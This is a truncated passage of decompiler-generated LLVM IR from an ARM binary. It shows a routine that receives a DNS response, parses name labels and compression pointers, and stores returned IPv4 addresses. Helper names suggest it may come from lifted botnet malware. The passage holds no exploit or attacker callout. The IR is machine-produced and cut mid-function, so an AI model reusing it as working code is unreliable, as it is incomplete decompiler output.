  %v2_f9e4 = icmp eq i32 %v1_f9e4, 0
  store i1 %v2_f9e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9e4, label %dec_label_pc_fa50, label %dec_label_pc_f9ec

dec_label_pc_f9ec:                                ; preds = %dec_label_pc_f9dc
  store i32 %v2_f9f0, i32* @r5, align 4
  store i32 %v2_f9f0, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fa00 = load i32, i32* @r6, align 4
  store i32 %v0_fa00, i32* %r0.global-to-local, align 4
  %v6_fa0c = call i32 @__libc_recvfrom(i32 %v0_fa00, i32 %v2_f9f0, i32 2048, i32 16384, i32 %v1_f9d4, i32 %v1_f9d4)
  store i32 %v6_fa0c, i32* %r4.global-to-local, align 4
  %v0_fa14 = load i32, i32* @sb, align 4
  store i32 %v0_fa14, i32* %r0.global-to-local, align 4
  %v1_fa18 = inttoptr i32 %v0_fa14 to i8*
  %v2_fa18 = call i32 @util_strlen(i8* %v1_fa18)
  %v1_fa1c = add i32 %v2_fa18, 17
  store i32 %v1_fa1c, i32* %r0.global-to-local, align 4
  %v0_fa20 = load i32, i32* %r4.global-to-local, align 4
  %v3_fa20 = icmp ult i32 %v0_fa20, %v1_fa1c
  %v9_fa20 = icmp eq i32 %v0_fa20, %v1_fa1c
  store i1 %v9_fa20, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_fa20, label %dec_label_pc_fa30, label %dec_label_pc_fa84

dec_label_pc_fa30:                                ; preds = %dec_label_pc_f9ec, %dec_label_pc_fa84, %dec_label_pc_fab0, %dec_label_pc_f9d4, %dec_label_pc_fa78
  %v0_fa30 = load i32, i32* @r8, align 4
  %v7_fa30 = icmp eq i32 %v0_fa30, 5
  store i1 %v7_fa30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa30, label %dec_label_pc_fa50, label %dec_label_pc_fa38

dec_label_pc_fa38:                                ; preds = %dec_label_pc_fa40, %dec_label_pc_fa30
  %v0_fa38 = phi i32 [ %v0_fa48, %dec_label_pc_fa40 ], [ %v0_fa30, %dec_label_pc_fa30 ]
  %v1_fa38 = add i32 %v0_fa38, 1
  %v0_f8cc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f8cc

dec_label_pc_fa40:                                ; preds = %dec_label_pc_f90c, %dec_label_pc_f8f4
  %v0_fa40 = phi i32 [ %v4_f91c, %dec_label_pc_f90c ], [ %v3_f900, %dec_label_pc_f8f4 ]
  %v1_fa40 = add i32 %v0_fa40, 2
  store i32 %v1_fa40, i32* %r0.global-to-local, align 4
  %v1_fa44 = call i32 @sleep(i32 %v1_fa40)
  store i32 %v1_fa44, i32* %r0.global-to-local, align 4
  %v0_fa48 = load i32, i32* @r8, align 4
  %v7_fa48 = icmp eq i32 %v0_fa48, 5
  store i1 %v7_fa48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa48, label %dec_label_pc_fa50, label %dec_label_pc_fa38

dec_label_pc_fa50:                                ; preds = %dec_label_pc_fa40, %dec_label_pc_fa30, %dec_label_pc_f9dc, %dec_label_pc_f974, %dec_label_pc_fabc, %dec_label_pc_fac8.backedge
  %v0_fa50 = load i32, i32* @r6, align 4
  store i32 %v0_fa50, i32* %r0.global-to-local, align 4
  %v1_fa54 = call i32 @__GI___libc_close(i32 %v0_fa50)
  store i32 %v1_fa54, i32* %r0.global-to-local, align 4
  %v0_fa58 = load i32, i32* @fp, align 4
  %v1_fa58 = inttoptr i32 %v0_fa58 to i8*
  %v2_fa58 = load i8, i8* %v1_fa58, align 1
  %v3_fa58 = zext i8 %v2_fa58 to i32
  store i32 %v3_fa58, i32* @r4, align 4
  %v2_fa5c = icmp eq i8 %v2_fa58, 0
  store i1 %v2_fa5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa5c, label %dec_label_pc_fba0, label %dec_label_pc_fa64

dec_label_pc_fa64:                                ; preds = %dec_label_pc_fa50, %dec_label_pc_fba0
  %v0_fa64 = phi i32 [ %v0_fa58, %dec_label_pc_fa50 ], [ %v0_fbb4, %dec_label_pc_fba0 ]
  store i32 %v0_fa64, i32* %r0.global-to-local, align 4
  store i32 %v3_f78c, i32* @r4, align 4
  store i32 %v9_f78c, i32* @r6, align 4
  store i32 %v12_f78c, i32* @r7, align 4
  store i32 %v15_f78c, i32* @r8, align 4
  store i32 %v18_f78c, i32* @sb, align 4
  store i32 %v21_f78c, i32* @sl, align 4
  store i32 %v24_f78c, i32* @fp, align 4
  store i32 %v27_f78c, i32* @lr, align 4
  ret i32 %v0_fa64

dec_label_pc_fa78:                                ; preds = %bb118
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_fa7c = call i32 @sleep(i32 1)
  store i32 %v1_fa7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fa30

dec_label_pc_fa84:                                ; preds = %dec_label_pc_f9ec
  store i32 %v2_fa84, i32* @sb, align 4
  store i32 %v2_fa84, i32* %r0.global-to-local, align 4
  %v2_fa8c = call i32 @util_strlen(i8* %v1_fa8c)
  store i32 %v2_f980, i32* @lr, align 4
  %v4_fa98 = load i16, i16* %stack_var_-4292, align 2
  %v5_fa98 = sext i16 %v4_fa98 to i32
  store i32 %v5_fa98, i32* %r3.global-to-local, align 4
  store i32 %v6_f85c, i32* %r1.global-to-local, align 4
  %v1_faa0 = load i32, i32* @sb, align 4
  %v9_faa4 = icmp eq i16 %v4_fa98, %v5_f874
  store i1 %v9_faa4, i1* %cpsr_z.global-to-local, align 1
  %v2_faa0 = add i32 %v2_fa8c, 5
  %v1_faa8 = add i32 %v2_faa0, %v1_faa0
  store i32 %v1_faa8, i32* %r0.global-to-local, align 4
  br i1 %v9_faa4, label %dec_label_pc_fab0, label %dec_label_pc_fa30

dec_label_pc_fab0:                                ; preds = %dec_label_pc_fa84
  store i32 %v4_fab0, i32* %r3.global-to-local, align 4
  store i1 %v2_fab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fab4, label %dec_label_pc_fa30, label %dec_label_pc_fabc

dec_label_pc_fabc:                                ; preds = %dec_label_pc_fab0
  %div = udiv i16 %tmp79, 256
  %v3_fabc = zext i16 %div to i32
  store i32 %v3_fabc, i32* %r2.global-to-local, align 4
  %v1_fac0 = mul nuw nsw i32 %v4_fab0, 256
  %v4_fac4 = and i32 %v1_fac0, 65280
  %v5_fac4 = or i32 %v4_fac4, %v3_fabc
  %v1_fac8134 = add nsw i32 %v5_fac4, -1
  %v3_facc135 = mul i32 %v1_fac8134, 65536
  store i32 %v3_facc135, i32* %r3.global-to-local, align 4
  %v7_fad0141 = icmp eq i32 %v3_facc135, -65536
  store i1 %v7_fad0141, i1* %cpsr_z.global-to-local, align 1
  %v3_fad4142 = urem i32 %v1_fac8134, 65536
  store i32 %v3_fad4142, i32* @r8, align 4
  br i1 %v7_fad0141, label %dec_label_pc_fa50, label %dec_label_pc_fadc

dec_label_pc_fadc:                                ; preds = %dec_label_pc_fabc, %dec_label_pc_fac8.backedge
  %v3_fad4144 = phi i32 [ %v3_fad4, %dec_label_pc_fac8.backedge ], [ %v3_fad4142, %dec_label_pc_fabc ]
  %v0_fb2c143 = phi i32 [ %storemerge29, %dec_label_pc_fac8.backedge ], [ %v1_faa8, %dec_label_pc_fabc ]
  store i32 %v0_fb2c143, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v1_fae818 = inttoptr i32 %v0_fb2c143 to i8*
  %v2_fae819 = load i8, i8* %v1_fae818, align 1
  %v3_fae820 = zext i8 %v2_fae819 to i32
  store i32 %v3_fae820, i32* %r2.global-to-local, align 4
  %v2_faec21 = icmp eq i8 %v2_fae819, 0
  store i1 %v2_faec21, i1* %cpsr_z.global-to-local, align 1
  %v3_faf022 = mul nuw nsw i32 %v3_fae820, 256
  store i32 %v3_faf022, i32* %r1.global-to-local, align 4
  br i1 %v2_faec21, label %dec_label_pc_fb24, label %dec_label_pc_faf8.preheader

dec_label_pc_faf8.preheader:                      ; preds = %dec_label_pc_fadc, %dec_label_pc_fae8.backedge
  %v1_fbc4 = phi i32 [ %v1_fbc450, %dec_label_pc_fae8.backedge ], [ 1, %dec_label_pc_fadc ]
  %v0_fbbc48 = phi i32 [ %v0_fbbc, %dec_label_pc_fae8.backedge ], [ 0, %dec_label_pc_fadc ]
  %v0_fb0446 = phi i32 [ %v3_faf0, %dec_label_pc_fae8.backedge ], [ %v3_faf022, %dec_label_pc_fadc ]
  %v0_fb0044 = phi i32 [ %v1_fbc0, %dec_label_pc_fae8.backedge ], [ %v0_fb2c143, %dec_label_pc_fadc ]
  %v0_faf842 = phi i32 [ %v3_fae8, %dec_label_pc_fae8.backedge ], [ %v3_fae820, %dec_label_pc_fadc ]
  br label %dec_label_pc_faf8

dec_label_pc_faf8:                                ; preds = %dec_label_pc_faf8.preheader, %dec_label_pc_fb00
  %v0_fbbc = phi i32 [ %v0_fbbc48, %dec_label_pc_faf8.preheader ], [ 1, %dec_label_pc_fb00 ]
  %v0_fb04 = phi i32 [ %v0_fb0446, %dec_label_pc_faf8.preheader ], [ %v3_fb1c, %dec_label_pc_fb00 ]
  %v0_fbc0 = phi i32 [ %v0_fb0044, %dec_label_pc_faf8.preheader ], [ %v2_fb0c, %dec_label_pc_fb00 ]
  %v0_faf8 = phi i32 [ %v0_faf842, %dec_label_pc_faf8.preheader ], [ %v3_fb10, %dec_label_pc_fb00 ]
  %v7_faf8 = icmp eq i32 %v0_faf8, 191
  store i1 %v7_faf8, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v0_faf8, 192
  br i1 %tmp, label %dec_label_pc_fbbc, label %dec_label_pc_fb00

dec_label_pc_fb00:                                ; preds = %dec_label_pc_faf8
  %v1_fb00 = add i32 %v0_fbc0, 1
  %v2_fb00 = inttoptr i32 %v1_fb00 to i8*
  %v3_fb00 = load i8, i8* %v2_fb00, align 1
  %v4_fb00 = zext i8 %v3_fb00 to i32
  %v2_fb04 = or i32 %v4_fb00, -49152
  %v0_fb0c = load i32, i32* @r5, align 4
  %v1_fb08 = add i32 %v0_fb0c, %v0_fb04
  %v2_fb0c = add i32 %v1_fb08, %v2_fb04
  store i32 %v2_fb0c, i32* %r3.global-to-local, align 4
  %v1_fb10 = inttoptr i32 %v2_fb0c to i8*
  %v2_fb10 = load i8, i8* %v1_fb10, align 1
  %v3_fb10 = zext i8 %v2_fb10 to i32
  store i32 %v3_fb10, i32* %r2.global-to-local, align 4
  %v2_fb14 = icmp eq i8 %v2_fb10, 0
  store i1 %v2_fb14, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v3_fb1c = mul nuw nsw i32 %v3_fb10, 256
  store i32 %v3_fb1c, i32* %r1.global-to-local, align 4
  br i1 %v2_fb14, label %dec_label_pc_fb24, label %dec_label_pc_faf8

dec_label_pc_fb24:                                ; preds = %dec_label_pc_fae8.backedge, %dec_label_pc_fb00, %dec_label_pc_fadc
  %v1_fb28 = phi i32 [ 1, %dec_label_pc_fadc ], [ %v1_fbc4, %dec_label_pc_fb00 ], [ %v1_fbc450, %dec_label_pc_fae8.backedge ]
  %v0_fb24 = phi i32 [ 0, %dec_label_pc_fadc ], [ 1, %dec_label_pc_fb00 ], [ %v0_fbbc, %dec_label_pc_fae8.backedge ]
  %v7_fb24 = icmp eq i32 %v0_fb24, 1
  store i1 %v7_fb24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb24, label %bb119, label %bb120

bb119:                                            ; preds = %dec_label_pc_fb24
  %v2_fb28 = add i32 %v1_fb28, 1
  store i32 %v2_fb28, i32* %ip.global-to-local, align 4
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_fb24, %bb119
  %v1_fb2c = phi i32 [ %v1_fb28, %dec_label_pc_fb24 ], [ %v2_fb28, %bb119 ]
  %v2_fb2c = add i32 %v1_fb2c, %v0_fb2c143
  store i32 %v2_fb2c, i32* @r4, align 4
  %v3_fb30 = inttoptr i32 %v2_fb2c to i8*
  %v4_fb30 = load i8, i8* %v3_fb30, align 1
  %v6_fb30 = zext i8 %v4_fb30 to i32
  store i32 %v6_fb30, i32* %r3.global-to-local, align 4
  %v1_fb34 = add i32 %v2_fb2c, 1
  %v2_fb34 = inttoptr i32 %v1_fb34 to i8*
  %v3_fb34 = load i8, i8* %v2_fb34, align 1
  %v4_fb34 = zext i8 %v3_fb34 to i32
  store i32 %v4_fb34, i32* %r2.global-to-local, align 4
  %v4_fb38 = mul nuw nsw i32 %v4_fb34, 256
  %v5_fb38 = or i32 %v4_fb38, %v6_fb30
  store i32 %v5_fb38, i32* %r3.global-to-local, align 4
  %v7_fb3c = icmp eq i32 %v5_fb38, 256
  store i1 %v7_fb3c, i1* %cpsr_z.global-to-local, align 1
  %v1_fb40 = add i32 %v2_fb2c, 10
  store i32 %v1_fb40, i32* @r7, align 4
  br i1 %v7_fb3c, label %dec_label_pc_fbdc, label %dec_label_pc_fb48

dec_label_pc_fb48:                                ; preds = %dec_label_pc_fbdc, %bb120
  store i32 %v1_fb40, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_fb5424 = inttoptr i32 %v1_fb40 to i8*
  %v2_fb5425 = load i8, i8* %v1_fb5424, align 1
  %v3_fb5426 = zext i8 %v2_fb5425 to i32
  store i32 %v3_fb5426, i32* %r2.global-to-local, align 4
  %v2_fb5827 = icmp eq i8 %v2_fb5425, 0
  store i1 %v2_fb5827, i1* %cpsr_z.global-to-local, align 1
  %v3_fb5c28 = mul nuw nsw i32 %v3_fb5426, 256
  store i32 %v3_fb5c28, i32* %r1.global-to-local, align 4
  br i1 %v2_fb5827, label %dec_label_pc_fb90, label %dec_label_pc_fb64.preheader

dec_label_pc_fb64.preheader:                      ; preds = %dec_label_pc_fb48, %dec_label_pc_fb54.backedge
  %v1_fbd4 = phi i32 [ %v1_fbd465, %dec_label_pc_fb54.backedge ], [ 1, %dec_label_pc_fb48 ]
  %v0_fbcc63 = phi i32 [ %v0_fbcc, %dec_label_pc_fb54.backedge ], [ 0, %dec_label_pc_fb48 ]
  %v0_fb7061 = phi i32 [ %v3_fb5c, %dec_label_pc_fb54.backedge ], [ %v3_fb5c28, %dec_label_pc_fb48 ]
  %v0_fb6c59 = phi i32 [ %v1_fbd0, %dec_label_pc_fb54.backedge ], [ %v1_fb40, %dec_label_pc_fb48 ]
  %v0_fb6457 = phi i32 [ %v3_fb54, %dec_label_pc_fb54.backedge ], [ %v3_fb5426, %dec_label_pc_fb48 ]
  br label %dec_label_pc_fb64

dec_label_pc_fb64:                                ; preds = %dec_label_pc_fb64.preheader, %dec_label_pc_fb6c
  %v0_fbcc = phi i32 [ %v0_fbcc63, %dec_label_pc_fb64.preheader ], [ 1, %dec_label_pc_fb6c ]
  %v0_fb70 = phi i32 [ %v0_fb7061, %dec_label_pc_fb64.preheader ], [ %v3_fb88, %dec_label_pc_fb6c ]
  %v0_fbd0 = phi i32 [ %v0_fb6c59, %dec_label_pc_fb64.preheader ], [ %v2_fb78, %dec_label_pc_fb6c ]
  %v0_fb64 = phi i32 [ %v0_fb6457, %dec_label_pc_fb64.preheader ], [ %v3_fb7c, %dec_label_pc_fb6c ]
  %v7_fb64 = icmp eq i32 %v0_fb64, 191
  store i1 %v7_fb64, i1* %cpsr_z.global-to-local, align 1
  %tmp159 = icmp ult i32 %v0_fb64, 192
  br i1 %tmp159, label %dec_label_pc_fbcc, label %dec_label_pc_fb6c

dec_label_pc_fb6c:                                ; preds = %dec_label_pc_fb64
  %v1_fb6c = add i32 %v0_fbd0, 1
  %v2_fb6c = inttoptr i32 %v1_fb6c to i8*
  %v3_fb6c = load i8, i8* %v2_fb6c, align 1
  %v4_fb6c = zext i8 %v3_fb6c to i32
  %v2_fb70 = or i32 %v4_fb6c, -49152
  %v0_fb78 = load i32, i32* @r5, align 4
  %v1_fb74 = add i32 %v0_fb78, %v0_fb70
  %v2_fb78 = add i32 %v1_fb74, %v2_fb70
  store i32 %v2_fb78, i32* %r3.global-to-local, align 4
  %v1_fb7c = inttoptr i32 %v2_fb78 to i8*
  %v2_fb7c = load i8, i8* %v1_fb7c, align 1
  %v3_fb7c = zext i8 %v2_fb7c to i32
  store i32 %v3_fb7c, i32* %r2.global-to-local, align 4
  %v2_fb80 = icmp eq i8 %v2_fb7c, 0
  store i1 %v2_fb80, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_fb88 = mul nuw nsw i32 %v3_fb7c, 256
  store i32 %v3_fb88, i32* %r1.global-to-local, align 4
  br i1 %v2_fb80, label %dec_label_pc_fb90, label %dec_label_pc_fb64

dec_label_pc_fb90:                                ; preds = %dec_label_pc_fb54.backedge, %dec_label_pc_fb6c, %dec_label_pc_fb48
  %v1_fb94 = phi i32 [ 1, %dec_label_pc_fb48 ], [ %v1_fbd4, %dec_label_pc_fb6c ], [ %v1_fbd465, %dec_label_pc_fb54.backedge ]
  %v0_fb90 = phi i32 [ 0, %dec_label_pc_fb48 ], [ 1, %dec_label_pc_fb6c ], [ %v0_fbcc, %dec_label_pc_fb54.backedge ]
  %v7_fb90 = icmp eq i32 %v0_fb90, 1
  store i1 %v7_fb90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fb90, label %bb121, label %bb122

bb121:                                            ; preds = %dec_label_pc_fb90
  %v2_fb94 = add i32 %v1_fb94, 1
  store i32 %v2_fb94, i32* %r0.global-to-local, align 4
  br label %bb122

bb122:                                            ; preds = %dec_label_pc_fbf0, %dec_label_pc_fb90, %bb121
  %v1_fb98 = phi i32 [ %v5_fc08, %dec_label_pc_fbf0 ], [ %v1_fb94, %dec_label_pc_fb90 ], [ %v2_fb94, %bb121 ]
  %v2_fb98 = add i32 %v1_fb98, %v1_fb40
  br label %dec_label_pc_fac8.backedge

dec_label_pc_fac8.backedge:                       ; preds = %bb122, %dec_label_pc_fc14
  %v0_fac8.pre = phi i32 [ %v3_fad4144, %bb122 ], [ %v0_fac8.pre.pre, %dec_label_pc_fc14 ]
  %storemerge29 = phi i32 [ %v2_fb98, %bb122 ], [ %v2_fc8c, %dec_label_pc_fc14 ]
  store i32 %storemerge29, i32* %r0.global-to-local, align 4
  %v1_fac8 = add i32 %v0_fac8.pre, -1
  %v3_facc = mul i32 %v1_fac8, 65536
  store i32 %v3_facc, i32* %r3.global-to-local, align 4
  %v7_fad0 = icmp eq i32 %v3_facc, -65536
  store i1 %v7_fad0, i1* %cpsr_z.global-to-local, align 1
  %v3_fad4 = urem i32 %v1_fac8, 65536
  store i32 %v3_fad4, i32* @r8, align 4
  br i1 %v7_fad0, label %dec_label_pc_fa50, label %dec_label_pc_fadc

dec_label_pc_fba0:                                ; preds = %dec_label_pc_fa50
  %v1_fba0 = add i32 %v0_fa58, 4
  %v2_fba0 = inttoptr i32 %v1_fba0 to i32*
  %v3_fba0 = load i32, i32* %v2_fba0, align 4
  store i32 %v3_fba0, i32* %r0.global-to-local, align 4
  %v2_fba4 = icmp eq i32 %v3_fba0, 0
  store i1 %v2_fba4, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_fbac.182 to i32), i32* @lr, align 4
  %v1_fba8 = xor i1 %v2_fba4, true
  call void @__pseudo_cond_branch(i1 %v1_fba8, i32 ptrtoint (i32* @global_var_14eb8.68 to i32))
  %v0_fbac = load i32, i32* @fp, align 4
  store i32 %v0_fbac, i32* @r0, align 4
  %v0_fbb0 = call i32 @free()
  store i32 %v0_fbb0, i32* %r0.global-to-local, align 4
  %v0_fbb4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_fa64

dec_label_pc_fbbc:                                ; preds = %dec_label_pc_faf8
  %v2_fbbc = icmp eq i32 %v0_fbbc, 0
  store i1 %v2_fbbc, i1* %cpsr_z.global-to-local, align 1
  %v1_fbc0 = add i32 %v0_fbc0, 1
  store i32 %v1_fbc0, i32* %r3.global-to-local, align 4
  br i1 %v2_fbbc, label %bb123, label %dec_label_pc_fae8.backedge

dec_label_pc_fae8.backedge:                       ; preds = %dec_label_pc_fbbc, %bb123
  %v1_fbc450 = phi i32 [ %v1_fbc4, %dec_label_pc_fbbc ], [ %v2_fbc4, %bb123 ]
  %v1_fae8 = inttoptr i32 %v1_fbc0 to i8*
  %v2_fae8 = load i8, i8* %v1_fae8, align 1
  %v3_fae8 = zext i8 %v2_fae8 to i32
  store i32 %v3_fae8, i32* %r2.global-to-local, align 4
  %v2_faec = icmp eq i8 %v2_fae8, 0
  store i1 %v2_faec, i1* %cpsr_z.global-to-local, align 1
  %v3_faf0 = mul nuw nsw i32 %v3_fae8, 256
  store i32 %v3_faf0, i32* %r1.global-to-local, align 4
  br i1 %v2_faec, label %dec_label_pc_fb24, label %dec_label_pc_faf8.preheader

bb123:                                            ; preds = %dec_label_pc_fbbc
  %v2_fbc4 = add i32 %v1_fbc4, 1
  store i32 %v2_fbc4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fae8.backedge

dec_label_pc_fbcc:                                ; preds = %dec_label_pc_fb64
  %v2_fbcc = icmp eq i32 %v0_fbcc, 0
  store i1 %v2_fbcc, i1* %cpsr_z.global-to-local, align 1
  %v1_fbd0 = add i32 %v0_fbd0, 1
  store i32 %v1_fbd0, i32* %r3.global-to-local, align 4
  br i1 %v2_fbcc, label %bb124, label %dec_label_pc_fb54.backedge

dec_label_pc_fb54.backedge:                       ; preds = %dec_label_pc_fbcc, %bb124
  %v1_fbd465 = phi i32 [ %v1_fbd4, %dec_label_pc_fbcc ], [ %v2_fbd4, %bb124 ]
  %v1_fb54 = inttoptr i32 %v1_fbd0 to i8*
  %v2_fb54 = load i8, i8* %v1_fb54, align 1
  %v3_fb54 = zext i8 %v2_fb54 to i32
  store i32 %v3_fb54, i32* %r2.global-to-local, align 4
  %v2_fb58 = icmp eq i8 %v2_fb54, 0
  store i1 %v2_fb58, i1* %cpsr_z.global-to-local, align 1
  %v3_fb5c = mul nuw nsw i32 %v3_fb54, 256
  store i32 %v3_fb5c, i32* %r1.global-to-local, align 4
  br i1 %v2_fb58, label %dec_label_pc_fb90, label %dec_label_pc_fb64.preheader

bb124:                                            ; preds = %dec_label_pc_fbcc
  %v2_fbd4 = add i32 %v1_fbd4, 1
  store i32 %v2_fbd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fb54.backedge

dec_label_pc_fbdc:                                ; preds = %bb120
  %v1_fbdc = add i32 %v2_fb2c, 2
  %v2_fbdc = inttoptr i32 %v1_fbdc to i8*
  %v3_fbdc = load i8, i8* %v2_fbdc, align 1
  %v4_fbdc = zext i8 %v3_fbdc to i32
  store i32 %v4_fbdc, i32* %r3.global-to-local, align 4
  %v1_fbe0 = add i32 %v2_fb2c, 3
  %v2_fbe0 = inttoptr i32 %v1_fbe0 to i8*
  %v3_fbe0 = load i8, i8* %v2_fbe0, align 1
  %v4_fbe0 = zext i8 %v3_fbe0 to i32
  store i32 %v4_fbe0, i32* %r2.global-to-local, align 4
  %v4_fbe4 = mul nuw nsw i32 %v4_fbe0, 256
  %v5_fbe4 = or i32 %v4_fbe4, %v4_fbdc
  store i32 %v5_fbe4, i32* %r3.global-to-local, align 4
  %v7_fbe8 = icmp eq i32 %v5_fbe4, 256
  store i1 %v7_fbe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fbe8, label %dec_label_pc_fbf0, label %dec_label_pc_fb48

dec_label_pc_fbf0:                                ; preds = %dec_label_pc_fbdc
  %v1_fbf0 = add i32 %v2_fb2c, 9
  %v2_fbf0 = inttoptr i32 %v1_fbf0 to i8*
  %v3_fbf0 = load i8, i8* %v2_fbf0, align 1
  %v4_fbf0 = zext i8 %v3_fbf0 to i32
  store i32 %v4_fbf0, i32* %r2.global-to-local, align 4
  %v1_fbf4 = add i32 %v2_fb2c, 8
  %v2_fbf4 = inttoptr i32 %v1_fbf4 to i8*
  %v3_fbf4 = load i8, i8* %v2_fbf4, align 1
  %v4_fbf4 = zext i8 %v3_fbf4 to i32
  %v4_fbf8 = mul nuw nsw i32 %v4_fbf0, 256
  %v5_fbf8 = or i32 %v4_fbf4, %v4_fbf8
  %v3_fbfc = mul i32 %v5_fbf8, 65536
  store i32 %v3_fbfc, i32* %r3.global-to-local, align 4
  %v3_fc00 = mul nuw nsw i32 %v4_fbf4, 256
  store i32 %v3_fc00, i32* %r2.global-to-local, align 4
  %v5_fc08 = or i32 %v3_fc00, %v4_fbf0
  store i32 %v5_fc08, i32* %r0.global-to-local, align 4
  %v7_fc0c = icmp eq i32 %v5_fc08, 4
  store i1 %v7_fc0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc0c, label %dec_label_pc_fc14, label %bb122

dec_label_pc_fc14:                                ; preds = %dec_label_pc_fbf0
  %v2_fc14 = inttoptr i32 %v1_fb40 to i8*
  %v3_fc14 = load i8, i8* %v2_fc14, align 1
  %v4_fc14 = zext i8 %v3_fc14 to i32
  store i32 %v4_fc14, i32* %r3.global-to-local, align 4
  store i32 %v2_f824, i32* %r2.global-to-local, align 4
  %v1_fc20 = add i32 %v2_fb2c, 11
  %v2_fc20 = inttoptr i32 %v1_fc20 to i8*
  %v3_fc20 = load i8, i8* %v2_fc20, align 1
  %v4_fc20 = zext i8 %v3_fc20 to i32
  store i32 %v4_fc20, i32* %r2.global-to-local, align 4
  store i32 %v2_f824, i32* %r3.global-to-local, align 4
  %v1_fc2c = add i32 %v2_fb2c, 12
  %v2_fc2c = inttoptr i32 %v1_fc2c to i8*
  %v3_fc2c = load i8, i8* %v2_fc2c, align 1
  %v4_fc2c = zext i8 %v3_fc2c to i32
  store i32 %v4_fc2c, i32* %r3.global-to-local, align 4
  store i32 %v2_f824, i32* %ip.global-to-local, align 4
  %v1_fc38 = add i32 %v2_fb2c, 13
  %v2_fc38 = inttoptr i32 %v1_fc38 to i8*
  %v3_fc38 = load i8, i8* %v2_fc38, align 1
  %v4_fc38 = zext i8 %v3_fc38 to i32
  store i32 %v4_fc38, i32* %r2.global-to-local, align 4
  %v0_fc40 = load i32, i32* @fp, align 4
  %v1_fc40 = inttoptr i32 %v0_fc40 to i8*
  %v2_fc40 = load i8, i8* %v1_fc40, align 1
  %v3_fc40 = zext i8 %v2_fc40 to i32
  %v1_fc44 = mul nuw nsw i32 %v3_fc40, 4
  %v3_fc48 = add nuw nsw i32 %v1_fc44, 4
  store i32 %v3_fc48, i32* %r1.global-to-local, align 4
  %v1_fc4c = add i32 %v0_fc40, 4
  %v2_fc4c = inttoptr i32 %v1_fc4c to i32*
  %v3_fc4c = load i32, i32* %v2_fc4c, align 4
  store i32 %v3_fc4c, i32* %r0.global-to-local, align 4
  %v3_fc50 = sext i8 %v3_fc38 to i32
  %v5_fc50 = sext i8 %v3_fc2c to i32
  %v10_fc50 = inttoptr i32 %v3_fc4c to i32*
  %v11_fc50 = call i32 @realloc(i32* %v10_fc50, i32 %v3_fc48, i32 %v3_fc50, i32 %v5_fc50)
  store i32 %v11_fc50, i32* %r0.global-to-local, align 4
  %v0_fc54 = load i32, i32* @fp, align 4
  %v1_fc54 = inttoptr i32 %v0_fc54 to i8*
  %v2_fc54 = load i8, i8* %v1_fc54, align 1
  %v3_fc54 = zext i8 %v2_fc54 to i32
  store i32 %v3_fc54, i32* %r2.global-to-local, align 4
  store i32 %v2_f824, i32* @lr, align 4
  %v4_fc5c = sext i8 %v3_fc14 to i32
  store i32 %v4_fc5c, i32* %r3.global-to-local, align 4
  %v1_fc60 = add nuw nsw i32 %v3_fc54, 1
  store i32 %v1_fc60, i32* %r1.global-to-local, align 4
  %v5_fc64 = mul nuw nsw i32 %v3_fc54, 4
  %v6_fc64 = add i32 %v5_fc64, %v11_fc50
  %v7_fc64 = inttoptr i32 %v6_fc64 to i32*
  store i32 %v4_fc5c, i32* %v7_fc64, align 4
  %v1_fc68 = load i32, i32* @fp, align 4
  %v2_fc68 = add i32 %v1_fc68, 4
  %v3_fc68 = inttoptr i32 %v2_fc68 to i32*
  store i32 %v11_fc50, i32* %v3_fc68, align 4
  %v0_fc6c = load i32, i32* %r1.global-to-local, align 4
  %v1_fc6c = trunc i32 %v0_fc6c to i8
  %v2_fc6c = load i32, i32* @fp, align 4
  %v3_fc6c = inttoptr i32 %v2_fc6c to i8*
  store i8 %v1_fc6c, i8* %v3_fc6c, align 1
  %v0_fc70 = load i32, i32* @r4, align 4
  %v1_fc70 = add i32 %v0_fc70, 9
  %v2_fc70 = inttoptr i32 %v1_fc70 to i8*
  %v3_fc70 = load i8, i8* %v2_fc70, align 1
  %v4_fc70 = zext i8 %v3_fc70 to i32
  store i32 %v4_fc70, i32* %r3.global-to-local, align 4
  %v1_fc74 = add i32 %v0_fc70, 8
  %v2_fc74 = inttoptr i32 %v1_fc74 to i8*
  %v3_fc74 = load i8, i8* %v2_fc74, align 1
  %v4_fc74 = zext i8 %v3_fc74 to i32
  %v4_fc78 = mul nuw nsw i32 %v4_fc70, 256
  %v5_fc78 = or i32 %v4_fc74, %v4_fc78
  %v3_fc7c = mul i32 %v5_fc78, 65536
  store i32 %v3_fc7c, i32* %r2.global-to-local, align 4
  %v3_fc80 = mul nuw nsw i32 %v4_fc74, 256
  store i32 %v3_fc80, i32* %r3.global-to-local, align 4
  %v5_fc88 = or i32 %v3_fc80, %v4_fc70
  store i32 %v5_fc88, i32* %r0.global-to-local, align 4
  %v0_fc8c = load i32, i32* @r7, align 4
  %v2_fc8c = add i32 %v0_fc8c, %v5_fc88
  %v0_fac8.pre.pre = load i32, i32* @r8, align 4
